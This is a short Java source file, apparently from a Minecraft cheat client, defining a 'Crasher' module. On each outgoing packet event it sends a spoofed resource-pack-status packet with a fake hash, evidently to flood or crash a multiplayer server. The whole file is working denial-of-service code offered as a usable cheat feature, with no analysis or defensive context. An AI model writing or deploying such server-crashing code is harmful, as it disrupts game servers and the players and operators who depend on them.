package axolotl.cheats.modules.impl.world;

import axolotl.cheats.events.*;
import axolotl.cheats.settings.ModeSetting;
import net.minecraft.network.play.client.*;

import axolotl.cheats.modules.Module;
import axolotl.util.PacketUtils;

public class Crasher extends Module {
	public ModeSetting mode = new ModeSetting("Mode", "Packet", "Packet");
	
	public Crasher() {
		super("Crasher", Category.WORLD, true);
		this.addSettings(mode);
		this.setSpecialSetting(mode);
	}

	public void onEvent(Event e) {
		
		if(e instanceof EventPacket && e.eventType == EventType.PRE) {
			switch(mode.getMode()) {

				case "Packet":
					PacketUtils.sendPacketNoEvent(new C19PacketResourcePackStatus("99999999", C19PacketResourcePackStatus.Action.SUCCESSFULLY_LOADED));
					break;
					
				default:
					break;
			}
		}

	}
	
}
